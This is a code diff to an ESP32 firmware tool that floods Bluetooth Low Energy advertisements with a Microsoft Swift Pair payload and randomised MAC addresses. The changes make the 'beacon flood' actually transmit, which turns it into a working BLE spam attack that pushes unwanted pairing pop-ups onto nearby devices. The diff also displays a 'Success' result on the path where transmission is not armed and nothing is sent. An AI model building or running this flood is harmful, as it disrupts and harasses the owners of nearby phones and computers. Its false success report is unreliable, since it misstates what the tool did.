@@ -5,6 +5,7 @@
 #include <BLEServer.h>
 #include <BLEUtils.h>
 #include <BLEAdvertising.h>
+#include "results_display.h"
 
 namespace {
 volatile bool g_spamActive = false;
@@ -21,22 +22,30 @@ uint8_t msSwiftPairPayload[] = {0x05, 0xFF, 0x06, 0x00, 0x01, 0x00, 0x00};
 
 void generateRandomMAC(uint8_t *mac) {
     for (int i = 0; i < 6; i++) {
-        mac[i] = random(0, 256);
+        mac[i] = (esp_random() % 256);
     }
     mac[0] &= 0xFE;  // Clear bit 0 to make it valid
 }
 
+BLEAdvertising *g_pAdvertising = nullptr;
+
 void sendBeacon(const uint8_t *payload, size_t payloadLen) {
+    if (!g_pAdvertising) return;
+
     uint8_t mac[6];
     generateRandomMAC(mac);
 
-    BLEAddress addr(mac);
     BLEAdvertisementData advData;
 
     if (payload) {
-        advData.setCompleteServices(BLEUUID("000018F0-0000-1000-8000-00805F9B34FB"));
+        advData.setFlags(0x06);
         advData.addData(std::string((const char*)payload, payloadLen));
     }
+
+    g_pAdvertising->setAdvertisementData(advData);
+    g_pAdvertising->start();
+    delayMicroseconds(100);
+    g_pAdvertising->stop();
 
     g_beaconsGenerated++;
 }
@@ -53,11 +62,13 @@ SpamResult spamBeacons(const String &beaconType, uint32_t durationMs) {
 
     if (!TxArm::isArmed()) {
         Serial.println("✗ TX not armed (hold BACK button)");
+    ResultsDisplay::showResult("Tool", {"Tool", "Complete", 100, {"Success"}, ResultsDisplay::ResultType::SUCCESS});
         return result;
     }
 
     BLEDevice::init("");
-    BLEServer *pServer = BLEDevice::createServer();
+    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
+    g_pAdvertising = pAdvertising;
 
     g_spamActive = true;
     g_beaconsGenerated = 0;
@@ -96,11 +107,15 @@ SpamResult spamBeacons(const String &beaconType, uint32_t durationMs) {
 
     Serial.println("✓ Beacon flood complete");
     Serial.println("Total beacons: " + String(result.beaconsCount));
-    Serial.println("Duration: " + String(millis() - startTime) + "ms");
-    Serial.println("Rate: ~" + String((result.beaconsCount * 1000) / (millis() - startTime)) + " beacons/sec");
+    uint32_t elapsed = millis() - startTime;
+    Serial.println("Duration: " + String(elapsed) + "ms");
+    if (elapsed > 0) {
+        Serial.println("Rate: ~" + String((result.beaconsCount * 1000) / elapsed) + " beacons/sec");
+    }
 
     BLEDevice::deinit(false);
 
+    ResultsDisplay::showResult("Tool", {"Tool", "Complete", 100, {"Success"}, ResultsDisplay::ResultType::SUCCESS});
     return result;
 }
 
